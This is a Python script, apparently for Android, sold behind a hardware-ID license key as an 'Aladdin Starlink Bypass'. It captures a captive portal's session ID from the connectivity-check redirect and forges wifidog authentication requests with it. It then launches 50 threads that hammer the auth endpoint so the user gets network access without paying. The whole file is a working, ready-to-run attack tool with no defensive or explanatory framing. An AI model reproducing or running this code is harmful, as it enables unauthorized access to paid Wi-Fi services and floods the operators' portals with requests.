import requests, re, urllib3, time, threading, os, random, hashlib, ssl, json, subprocess
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
KEY_URL = "https://raw.githubusercontent.com/5Lkhant09/my-license-server/main/key.txt"

def get_hwid():
    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown":
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        return f"TRB-{hashlib.md5(serial.encode()).hexdigest()[:10].upper()}"
    except:
        return "TRB-UNKNOWN"

def high_speed_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            # ဒီနေရာမှာ ပုံ ထဲကလို စာတန်းတွေ ပြပေးမှာပါ
            print(f"\033[92m[✓] Aladdin Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01)
        except:
            time.sleep(1)
            break

def check_license():
    hwid = get_hwid()
    os.system('clear')
    print(f"\033[93m =======================================")
    print(f"\033[96m   Aladdin Starlink Bypass - IMMORTAL V11")
    print(f"\033[93m =======================================\n")
    print(f"\033[94m[*] YOUR DEVICE ID: {hwid}\033[0m")
    input_key = input("\033[93m[>] ENTER ACCESS KEY: \033[0m").strip()
    
    try:
        response = requests.get(KEY_URL, timeout=15, verify=False).text
        for line in response.splitlines():
            if "|" in line:
                db_id, db_key, db_date = line.split("|")
                if db_id.strip() == hwid and db_key.strip() == input_key:
                    print(f"\033[92m[✓] ACCESS GRANTED! EXPIRY: {db_date}\033[0m")
                    time.sleep(1.5)
                    return True
        print("\033[91m[!] INVALID KEY OR ID NOT REGISTERED.\033[0m")
        return False
    except:
        print(f"\033[91m[!] CONNECTION ERROR!\033[0m")
        return False

def start_bypass():
    if not check_license(): return
    
    print("\033[94m[*] Aladdin Force Scanning Portal...\033[0m")
    while True:
        try:
            # Portal SID ဖမ်းယူခြင်း
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            sid = parse_qs(urlparse(r.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"\033[96m[✓] Aladdin SID Captured: {sid[:15]}\033[0m")
                p_url = urlparse(r.url)
                # Auth Link တည်ဆောက်ခြင်း
                auth_link = f"{p_url.scheme}://{p_url.netloc}/wifidog/auth?token={sid}"
                
                print("\033[95m[*] ⚡ Launching Bypass Threads... ⚡\033[0m")
                # Thread ပေါင်း ၅၀ နဲ့ Pulse ပို့ခြင်း
                for _ in range(50):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                # အင်တာနက်ပြတ်မပြတ် စောင့်ကြည့်ခြင်း
                while True:
                    time.sleep(10)
            else:
                time.sleep(2)
        except:
            time.sleep(2)

if __name__ == "__main__":
    try:
        start_bypass()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Stopped.\033[0m")
